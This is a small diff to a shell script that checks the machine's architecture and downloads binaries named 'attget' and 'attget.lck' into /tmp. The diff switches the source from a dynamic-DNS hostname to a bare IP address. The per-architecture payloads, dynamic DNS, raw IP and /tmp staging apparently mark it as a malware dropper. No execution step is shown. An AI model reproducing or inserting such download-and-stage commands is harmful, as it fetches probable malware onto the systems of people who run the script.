@@ -8,11 +8,11 @@ ARCH=$(uname -m)
 echo "Architecture: $ARCH"
 
 if [ "$ARCH" = "x86_64" ]; then
-    wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget"
-    wget -O /tmp/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
+    wget -O /tmp/attget "http://144.172.91.84/public/attget"
+    wget -O /tmp/attget.lck "http://144.172.91.84/public/attget.lck"
 elif [ "$ARCH" = "aarch64" ]; then
-    wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget_arm64"
-    wget -O /tmp/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
+    wget -O /tmp/attget "http://144.172.91.84/public/attget_arm64"
+    wget -O /tmp/attget.lck "http://144.172.91.84/public/attget.lck"
 fi
 
 sleep 2
